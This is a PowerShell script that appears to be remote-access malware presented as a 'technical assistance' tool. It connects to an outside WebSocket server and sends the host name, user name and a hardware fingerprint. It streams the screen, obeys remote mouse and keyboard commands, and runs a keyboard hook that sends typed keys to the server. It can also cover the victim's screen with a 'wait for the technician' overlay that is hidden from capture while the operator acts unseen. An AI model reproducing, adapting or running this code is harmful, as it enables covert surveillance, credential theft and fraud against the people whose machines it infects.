Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$inputCode = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public static class Input {
    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);

    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int nIndex);

    [StructLayout(LayoutKind.Sequential)]
    struct INPUT {
        public int type;
        public INPUTUNION u;
    }

    [StructLayout(LayoutKind.Explicit)]
    struct INPUTUNION {
        [FieldOffset(0)] public MOUSEINPUT mi;
        [FieldOffset(0)] public KEYBDINPUT ki;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct MOUSEINPUT {
        public int dx, dy;
        public uint mouseData, dwFlags, time;
        public IntPtr dwExtraInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct KEYBDINPUT {
        public ushort wVk, wScan;
        public uint dwFlags, time;
        public IntPtr dwExtraInfo;
    }

    const int INPUT_MOUSE = 0;
    const int INPUT_KEYBOARD = 1;
    const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
    const uint MOUSEEVENTF_LEFTUP = 0x0004;
    const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    const uint MOUSEEVENTF_RIGHTUP = 0x0010;
    const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
    const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
    const uint MOUSEEVENTF_WHEEL = 0x0800;
    const uint KEYEVENTF_KEYUP = 0x0002;

    public static int ScreenW { get { return GetSystemMetrics(0); } }
    public static int ScreenH { get { return GetSystemMetrics(1); } }

    public static bool MoveTo(int x, int y) { return SetCursorPos(x, y); }

    public static uint Click(int x, int y, int btn, int count) {
        SetCursorPos(x, y);
        Thread.Sleep(30);
        uint down, up;
        if (btn == 1) { down = MOUSEEVENTF_RIGHTDOWN; up = MOUSEEVENTF_RIGHTUP; }
        else if (btn == 2) { down = MOUSEEVENTF_MIDDLEDOWN; up = MOUSEEVENTF_MIDDLEUP; }
        else { down = MOUSEEVENTF_LEFTDOWN; up = MOUSEEVENTF_LEFTUP; }
        uint total = 0;
        for (int i = 0; i < count; i++) {
            INPUT[] inputs = new INPUT[2];
            inputs[0].type = INPUT_MOUSE; inputs[0].u.mi.dwFlags = down;
            inputs[1].type = INPUT_MOUSE; inputs[1].u.mi.dwFlags = up;
            total += SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
            Thread.Sleep(30);
        }
        return total;
    }

    public static uint Scroll(int delta) {
        INPUT[] inputs = new INPUT[1];
        inputs[0].type = INPUT_MOUSE;
        inputs[0].u.mi.dwFlags = MOUSEEVENTF_WHEEL;
        inputs[0].u.mi.mouseData = (uint)(delta * 120);
        return SendInput(1, inputs, Marshal.SizeOf(typeof(INPUT)));
    }

    public static uint Key(ushort vk) {
        INPUT[] inputs = new INPUT[2];
        inputs[0].type = INPUT_KEYBOARD; inputs[0].u.ki.wVk = vk;
        inputs[1].type = INPUT_KEYBOARD; inputs[1].u.ki.wVk = vk; inputs[1].u.ki.dwFlags = KEYEVENTF_KEYUP;
        return SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
    }

    public static uint KeyDown(ushort vk) {
        INPUT[] inputs = new INPUT[1];
        inputs[0].type = INPUT_KEYBOARD; inputs[0].u.ki.wVk = vk;
        return SendInput(1, inputs, Marshal.SizeOf(typeof(INPUT)));
    }

    public static uint KeyUp(ushort vk) {
        INPUT[] inputs = new INPUT[1];
        inputs[0].type = INPUT_KEYBOARD; inputs[0].u.ki.wVk = vk; inputs[0].u.ki.dwFlags = KEYEVENTF_KEYUP;
        return SendInput(1, inputs, Marshal.SizeOf(typeof(INPUT)));
    }
}
"@
Add-Type -TypeDefinition $inputCode

$Global:URL = "wss://web-production-9d7cc.up.railway.app"
$Global:id = $null
$Global:run = $true
$Global:panel = $false
$Global:locked = $false
$Global:lockProcess = $null
$Global:lockFile = $null
$Global:scale = 0.6
$Global:quality = 50
$Global:captureInput = $false
$Global:captureRunspace = $null
$Global:captureQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()

$Global:VK = @{
    'Enter'=0x0D;'Backspace'=0x08;'Tab'=0x09;'Escape'=0x1B;'Space'=0x20;' '=0x20
    'ArrowUp'=0x26;'ArrowDown'=0x28;'ArrowLeft'=0x25;'ArrowRight'=0x27
    'Delete'=0x2E;'Home'=0x24;'End'=0x23;'PageUp'=0x21;'PageDown'=0x22
    'Insert'=0x2D;'CapsLock'=0x14
    'F1'=0x70;'F2'=0x71;'F3'=0x72;'F4'=0x73;'F5'=0x74;'F6'=0x75
    'F7'=0x76;'F8'=0x77;'F9'=0x78;'F10'=0x79;'F11'=0x7A;'F12'=0x7B
    'Control'=0x11;'Alt'=0x12;'Shift'=0x10;'Meta'=0x5B
}

function HWID {
    try {
        $u = (Get-WmiObject Win32_ComputerSystemProduct).UUID
        $m = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress } | Select-Object -First 1).MACAddress
        $h = [System.Security.Cryptography.SHA256]::Create()
        return ([BitConverter]::ToString($h.ComputeHash([Text.Encoding]::UTF8.GetBytes("$u$m"))) -replace '-','').Substring(0,16)
    } catch { return "N/A" }
}

function Screen {
    $w = [Input]::ScreenW
    $h = [Input]::ScreenH
    $sw = [int]($w * $Global:scale)
    $sh = [int]($h * $Global:scale)

    $bmp = New-Object Drawing.Bitmap($w, $h)
    $g = [Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0, 0, 0, 0, [Drawing.Size]::new($w, $h))
    $g.Dispose()

    $out = New-Object Drawing.Bitmap($sw, $sh)
    $g2 = [Drawing.Graphics]::FromImage($out)
    $g2.InterpolationMode = 'HighQualityBicubic'
    $g2.DrawImage($bmp, 0, 0, $sw, $sh)
    $g2.Dispose()
    $bmp.Dispose()

    $ms = New-Object IO.MemoryStream
    $enc = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
    $prm = New-Object Drawing.Imaging.EncoderParameters(1)
    $prm.Param[0] = New-Object Drawing.Imaging.EncoderParameter([Drawing.Imaging.Encoder]::Quality, $Global:quality)
    $out.Save($ms, $enc, $prm)
    $out.Dispose()

    $b64 = [Convert]::ToBase64String($ms.ToArray())
    $ms.Dispose()
    return @{ frame=$b64; width=$sw; height=$sh }
}

function GetVK($k) {
    if ($Global:VK.ContainsKey($k)) { return $Global:VK[$k] }
    if ($k.Length -eq 1) { return [int][char]$k.ToUpper() }
    return 0
}

function DoClick($x, $y, $btn, $n) {
    $rx = [int]($x / $Global:scale)
    $ry = [int]($y / $Global:scale)
    $b = if ($btn -eq 'right') { 1 } elseif ($btn -eq 'middle') { 2 } else { 0 }
    [Input]::Click($rx, $ry, $b, $n) | Out-Null
}

function DoKey($k) {
    $vk = GetVK $k
    if ($vk -gt 0) { [Input]::Key([uint16]$vk) | Out-Null }
}

function DoCombo($keys) {
    $vks = @()
    foreach ($k in $keys) {
        $vk = GetVK $k
        if ($vk -gt 0) { $vks += $vk }
    }
    foreach ($vk in $vks) { [Input]::KeyDown([uint16]$vk); Start-Sleep -Milliseconds 20 }
    Start-Sleep -Milliseconds 50
    for ($i = $vks.Count - 1; $i -ge 0; $i--) { [Input]::KeyUp([uint16]$vks[$i]); Start-Sleep -Milliseconds 20 }
}

function DoScroll($d) { [Input]::Scroll($d) | Out-Null }

function DoMove($x, $y) {
    $rx = [int]($x / $Global:scale)
    $ry = [int]($y / $Global:scale)
    [Input]::MoveTo($rx, $ry) | Out-Null
}

function Lock($html) {
    if ($Global:locked) { return }
    $Global:locked = $true

    # Debug: salva o HTML recebido em arquivo temporário
    try { "$html" | Out-File "$env:TEMP\lockhtml_debug.txt" -Force } catch {}

    $defaultHtml = @"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #0a0a0f 100%);
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: 'Segoe UI', Arial, sans-serif;
    color: white;
    overflow: hidden;
}
.container { text-align: center; }
h1 { font-size: 48px; font-weight: 300; margin-bottom: 20px; }
p { font-size: 18px; color: rgba(255,255,255,0.6); }
.spinner {
    width: 50px; height: 50px;
    border: 3px solid rgba(255,255,255,0.1);
    border-top-color: #3b82f6;
    border-radius: 50%;
    margin: 30px auto;
    animation: spin 1s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="container">
    <h1>Aguarde o tecnico...</h1>
    <div class="spinner"></div>
    <p>Por favor, aguarde o tecnico liberar a tela.</p>
</div>
</body>
</html>
"@

    $htmlContent = if ($html -and $html -ne 'null' -and $html -ne '' -and $html.Length -gt 50) { $html } else { $defaultHtml }
    $htmlB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($htmlContent))

    $code = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class LockAPI {
    [DllImport("user32.dll")]
    public static extern bool SetWindowDisplayAffinity(IntPtr hwnd, uint affinity);
    [DllImport("user32.dll")]
    public static extern int GetWindowLong(IntPtr hwnd, int index);
    [DllImport("user32.dll")]
    public static extern int SetWindowLong(IntPtr hwnd, int index, int value);
}
'@
`$h = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$htmlB64'))
`$f = New-Object Windows.Forms.Form
`$f.FormBorderStyle = 'None'
`$f.StartPosition = 'Manual'
`$f.Location = [Drawing.Point]::new(0, 0)
`$f.Size = [Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
`$f.TopMost = `$true
`$f.ShowInTaskbar = `$false
`$w = New-Object Windows.Forms.WebBrowser
`$w.Dock = 'Fill'
`$w.ScrollBarsEnabled = `$false
`$w.IsWebBrowserContextMenuEnabled = `$false
`$w.AllowNavigation = `$false
`$f.Controls.Add(`$w)
`$f.Add_Shown({
    `$w.DocumentText = `$h
    [LockAPI]::SetWindowDisplayAffinity(`$f.Handle, 17)
    `$st = [LockAPI]::GetWindowLong(`$f.Handle, -20)
    [LockAPI]::SetWindowLong(`$f.Handle, -20, `$st -bor 0x80000 -bor 0x20)
})
[Windows.Forms.Application]::Run(`$f)
"@

    $lockFile = "$env:TEMP\lock_$(Get-Random).ps1"
    $code | Out-File -FilePath $lockFile -Encoding UTF8
    $Global:lockProcess = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$lockFile`"" -PassThru -WindowStyle Hidden
    $Global:lockFile = $lockFile
}

function Unlock {
    if (-not $Global:locked) { return }

    if ($Global:lockProcess) {
        try { $Global:lockProcess.Kill() } catch {}
        try { $Global:lockProcess.Dispose() } catch {}
        $Global:lockProcess = $null
    }

    if ($Global:lockFile -and (Test-Path $Global:lockFile)) {
        try { Remove-Item $Global:lockFile -Force } catch {}
        $Global:lockFile = $null
    }

    $Global:locked = $false
}

function Run {
    [Console]::Title = "Assistencia Tecnica"

    while ($Global:run) {
        try {
            $ws = New-Object Net.WebSockets.ClientWebSocket
            $ws.ConnectAsync([Uri]$Global:URL, [Threading.CancellationToken]::None).Wait() | Out-Null

            $info = @{
                type = "register-client"
                hostname = $env:COMPUTERNAME
                username = $env:USERNAME
                os = [Environment]::OSVersion.VersionString
                hwid = HWID
            } | ConvertTo-Json -Compress

            $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes($info)), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null

            $buf = [byte[]]::new(65536)
            $ft = [Diagnostics.Stopwatch]::StartNew()
            $pt = [Diagnostics.Stopwatch]::StartNew()
            $task = $null

            while ($Global:run -and $ws.State -eq 'Open') {
                if ($task -eq $null) {
                    $task = $ws.ReceiveAsync([ArraySegment[byte]]::new($buf), [Threading.CancellationToken]::None)
                }

                if ($task.IsCompleted) {
                    $res = $task.Result
                    $task = $null

                    if ($res.MessageType -eq 'Close') { break }
                    if ($res.Count -gt 0) {
                        $msg = [Text.Encoding]::UTF8.GetString($buf, 0, $res.Count) | ConvertFrom-Json

                        switch ($msg.type) {
                            "registered" { $Global:id = $msg.clientId }
                            "panel-connected" { $Global:panel = $true }
                            "panel-disconnected" { $Global:panel = $false; Unlock }
                            "mouse-click" { DoClick $msg.x $msg.y $msg.button $(if ($msg.clicks) { $msg.clicks } else { 1 }) }
                            "mouse-move" { DoMove $msg.x $msg.y }
                            "mouse-scroll" { DoScroll $msg.delta }
                            "key-press" { DoKey $msg.key }
                            "key-combination" { DoCombo $msg.keys }
                            "lock-screen" { Lock $msg.html }
                            "unlock-screen" { Unlock }
                            "set-quality" {
                                $Global:quality = if ($msg.quality) { $msg.quality } else { 70 }
                                $Global:scale = if ($msg.scale) { $msg.scale } else { 0.75 }
                            }
                            "start-capture" {
                                if (-not $Global:captureInput) {
                                    $Global:captureInput = $true
                                    # Iniciar runspace com hook de teclado
                                    $Global:captureRunspace = [PowerShell]::Create()
                                    $Global:captureRunspace.AddScript({
                                        param($queue)
                                        Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Concurrent;
using System.Windows.Forms;
using System.Threading;

public class KH {
    delegate IntPtr LP(int n, IntPtr w, IntPtr l);
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, LP lp, IntPtr h, uint t);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("user32.dll")] static extern int GetKeyboardState(byte[] s);
    [DllImport("user32.dll")] static extern int ToUnicode(uint vk, uint sc, byte[] s, StringBuilder b, int c, uint f);
    [DllImport("user32.dll")] static extern uint MapVirtualKey(uint c, uint t);
    static IntPtr hk = IntPtr.Zero;
    static LP pr = CB;
    static ConcurrentQueue<string> Q;
    public static bool Run = true;
    public static void Start(ConcurrentQueue<string> q) {
        Q = q;
        hk = SetWindowsHookEx(13, pr, GetModuleHandle(null), 0);
        while (Run) { Application.DoEvents(); Thread.Sleep(5); }
        if (hk != IntPtr.Zero) UnhookWindowsHookEx(hk);
    }
    public static void Stop() { Run = false; }
    static IntPtr CB(int n, IntPtr w, IntPtr l) {
        if (n >= 0 && w == (IntPtr)0x100) {
            int vk = Marshal.ReadInt32(l);
            byte[] ks = new byte[256]; GetKeyboardState(ks);
            StringBuilder sb = new StringBuilder(4);
            int r = ToUnicode((uint)vk, MapVirtualKey((uint)vk, 0), ks, sb, 4, 0);
            if (r > 0) Q.Enqueue(sb.ToString());
            else {
                if (vk == 13) Q.Enqueue("\n");
                else if (vk == 8) Q.Enqueue("[BAK]");
                else if (vk == 9) Q.Enqueue("[TAB]");
            }
        }
        return CallNextHookEx(hk, n, w, l);
    }
}
"@ -ReferencedAssemblies System.Windows.Forms
                                        [KH]::Start($queue)
                                    }).AddArgument($Global:captureQueue)
                                    $Global:captureRunspace.BeginInvoke() | Out-Null
                                }
                            }
                            "stop-capture" {
                                $Global:captureInput = $false
                                if ($Global:captureRunspace) {
                                    try {
                                        Add-Type @"
using System; using System.Runtime.InteropServices;
public class KHStop { [DllImport("user32.dll")] public static extern bool PostThreadMessage(uint t, uint m, IntPtr w, IntPtr l); }
"@
                                        [KH]::Stop()
                                    } catch {}
                                    try { $Global:captureRunspace.Stop() } catch {}
                                    try { $Global:captureRunspace.Dispose() } catch {}
                                    $Global:captureRunspace = $null
                                }
                            }
                            "disconnect-client" { Unlock; $Global:run = $false }
                        }
                    }
                }

                if ($Global:panel -and $ft.ElapsedMilliseconds -ge 66) {
                    $ft.Restart()
                    try {
                        $cap = Screen
                        $frame = @{ type="screen-frame"; clientId=$Global:id; frame=$cap.frame; width=$cap.width; height=$cap.height } | ConvertTo-Json -Compress
                        $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes($frame)), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null
                    } catch { break }
                }

                if ($pt.ElapsedMilliseconds -ge 15000) {
                    $pt.Restart()
                    try { $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes('{"type":"ping"}')), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null } catch {}
                }

                # Enviar teclas capturadas da queue (hook em runspace separado)
                if ($Global:captureInput -and $Global:captureQueue) {
                    try {
                        $captured = ""
                        $key = $null
                        while ($Global:captureQueue.TryDequeue([ref]$key)) {
                            $captured += $key
                        }
                        if ($captured.Length -gt 0) {
                            $captureMsg = @{ type="captured-keys"; clientId=$Global:id; keys=$captured } | ConvertTo-Json -Compress
                            $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes($captureMsg)), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null
                        }
                    } catch {}
                }

                Start-Sleep -Milliseconds 20
            }

            Unlock
            $Global:panel = $false
            $ws.Dispose()
        } catch {
            Unlock
            $Global:panel = $false
            Start-Sleep -Seconds 5
        }
    }
}

Run
